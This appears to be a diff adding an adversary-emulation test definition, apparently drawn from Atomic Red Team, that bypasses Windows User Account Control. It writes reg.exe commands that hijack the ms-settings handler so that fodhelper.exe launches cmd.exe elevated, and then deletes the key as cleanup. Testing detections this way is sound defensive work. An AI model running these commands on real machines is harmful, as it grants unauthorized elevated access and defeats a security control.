@@ -1,0 +1,52 @@
+{
+  "id": "58f641ea-12e3-499a-b684-44dee46bd182",
+  "name": "Bypass UAC using Fodhelper",
+  "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "7d6fd694-867b-4007-87d4-8c20b4bbe269",
+      "type": "execute-command",
+      "data": {
+        "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "256b964f-15ca-44c4-88b6-4cb06a301a44",
+      "type": "execute-command",
+      "data": {
+        "command": "reg.exe delete hkcu\\software\\classes\\ms-settings /f \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "7d6fd694-867b-4007-87d4-8c20b4bbe269",
+      "p": "on-success",
+      "o": "256b964f-15ca-44c4-88b6-4cb06a301a44"
+    },
+    {
+      "s": "7d6fd694-867b-4007-87d4-8c20b4bbe269",
+      "p": "on-failure",
+      "o": "256b964f-15ca-44c4-88b6-4cb06a301a44"
+    }
+  ],
+  "tags": [
+    "T1548.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "executable_binary",
+      "type": "path",
+      "description": "Binary to execute with UAC Bypass",
+      "value": "C:\\Windows\\System32\\cmd.exe"
+    }
+  ]
+}
